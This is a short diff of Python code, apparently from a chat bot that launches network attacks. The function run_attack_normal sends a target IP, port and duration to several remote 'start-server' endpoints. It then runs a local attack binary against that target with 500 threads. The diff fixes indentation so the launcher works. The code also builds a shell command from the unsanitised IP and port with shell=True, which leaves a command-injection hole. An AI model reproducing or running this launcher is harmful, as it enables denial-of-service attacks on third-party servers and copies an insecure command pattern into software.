@@ -105,28 +105,26 @@ def get_user_stats(user_id):
 def run_attack_normal(attack_id, ip, port, duration, username, chat_id):
     try:
         def call_apis():
-for endpoint in API_ENDPOINTS:
-    try:
-        url = f"https://{endpoint}/start-server"
-        res = requests.post(
-            url,
-            json={
-                "ip": ip,
-                "port": port,
-                "duration": duration,
-                "threads": 6
-            },
-            timeout=5
-        )
-        print("API STATUS:", res.status_code)
-        print("API RESPONSE:", res.text)
+            for endpoint in API_ENDPOINTS:
+                try:
+                    url = f"https://{endpoint}/start-server"
+                    res = requests.post(
+                        url,
+                        json={
+                            "ip": ip,
+                            "port": port,
+                            "duration": duration,
+                            "threads": 6
+                        },
+                        timeout=5
+                    )
+                    print("API STATUS:", res.status_code)
+                    print("API RESPONSE:", res.text)
+                except Exception as e:
+                    print("API ERROR:", str(e))
 
-    except Exception as e:
-        print("API ERROR:", str(e))
-        
         api_thread = threading.Thread(target=call_apis)
         api_thread.start()
-        
         cmd = f"{BGMI_PATH} {ip} {port} {duration} 500"
         print(f"[+] Executing: {cmd}")
         process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
